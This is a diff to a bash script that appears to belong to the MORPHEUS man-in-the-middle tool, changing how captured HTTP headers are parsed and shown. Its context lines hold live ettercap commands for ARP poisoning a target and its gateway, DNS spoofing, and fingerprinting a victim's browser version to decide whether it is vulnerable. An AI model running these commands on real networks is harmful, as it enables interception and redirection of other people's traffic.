@@ -939,18 +939,18 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
         xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost/ /$gateway/ && sleep 3"
       fi
 
-  # check if target system its vuln
+  # check if target system its vulnerable (firefox version)
   # User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0
   nOn="49" # above versions are patched (official release its 51.0.1)...
-  HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print $2,$3'}` > /dev/null 2>&1
-  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print $2,$3'}` > /dev/null 2>&1
-  DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print $2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12'}` > /dev/null 2>&1
-  VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print $2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12'} | cut -d 'F' -f2 | cut -d '/' -f2 | cut -d '.' -f1` > /dev/null 2>&1
+  HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print'}` > /dev/null 2>&1
+  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print'}` > /dev/null 2>&1
+  DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print'}` > /dev/null 2>&1
+  VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent" | cut -d 'F' -f2 | cut -d '/' -f2 | cut -d '.' -f1` > /dev/null 2>&1
   echo "${GreenF}    Host: $HoSt"
   sleep 1
   echo "${GreenF}    Accept-Language: $AcLa"
   sleep 1
-  echo "${GreenF}    User-Agent: $DisP"
+  echo "${GreenF}    $DisP"
   sleep 1
 
 
@@ -988,7 +988,6 @@ fi
         ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/Firefox_buffer -M ARP /$rhost/ /$gateway/
         fi
       fi
-
 
 
   # clean up
@@ -1082,15 +1081,15 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
 # Mozilla/5.0 (Linux; Android 6.0.1; VFD 600 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36
 # Mozilla/5.0 (Linux; U; Android 4.0.3; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30
   nOn="Android"
-  HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print $2,$3'}` > /dev/null 2>&1
-  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print $2,$3,$3'}` > /dev/null 2>&1
-  DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print $2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16'}` > /dev/null 2>&1
+  HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print'}` > /dev/null 2>&1
+  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print'}` > /dev/null 2>&1
+  DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print'}` > /dev/null 2>&1
   VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print $5'}` > /dev/null 2>&1 # user-agent == Android
   echo "${GreenF}    Host: $HoSt"
   sleep 1
   echo "${GreenF}    Accept-Language: $AcLa"
   sleep 1
-  echo "${GreenF}    User-Agent: $DisP"
+  echo "${GreenF}    $DisP"
   sleep 1
 
 
@@ -1129,7 +1128,6 @@ fi
         ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/Firefox_buffer -M ARP /$rhost/ /$gateway/
         fi
       fi
-
 
 
   # clean up
@@ -1219,22 +1217,22 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
         xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost/ /$gateway/ && sleep 3"
       fi
 
-  # check if target system its vuln
+  # check if target system its vulnerable
   # User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
   nOn="Windows" # only windows systems are affected...
-  HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print $2,$3'}` > /dev/null 2>&1
-  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print $2,$3'}` > /dev/null 2>&1
+  HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print'}` > /dev/null 2>&1
+  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print'}` > /dev/null 2>&1
   VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print $3'} | cut -d '(' -f2` > /dev/null 2>&1
-  DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print $2,$3,$4,$5,$6,$7'}` > /dev/null 2>&1
+  DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print'}` > /dev/null 2>&1
   echo "${GreenF}    Host: $HoSt"
   sleep 1
   echo "${GreenF}    Accept-Language: $AcLa"
   sleep 1
-  echo "${GreenF}    User-Agent: $DisP"
+  echo "${GreenF}    $DisP"
   sleep 1
 
 
-if [ $VeVul != $nOn ]; then
+if [ "$VeVul" != "$nOn" ]; then
 echo "${GreenF}    System report:${RedF} not vulnerable...${BlueF}"
 sleep 3
 echo "${RedF}[x]${white} module cant verify system distro ${RedF}(${YellowF}running blind${RedF})!"
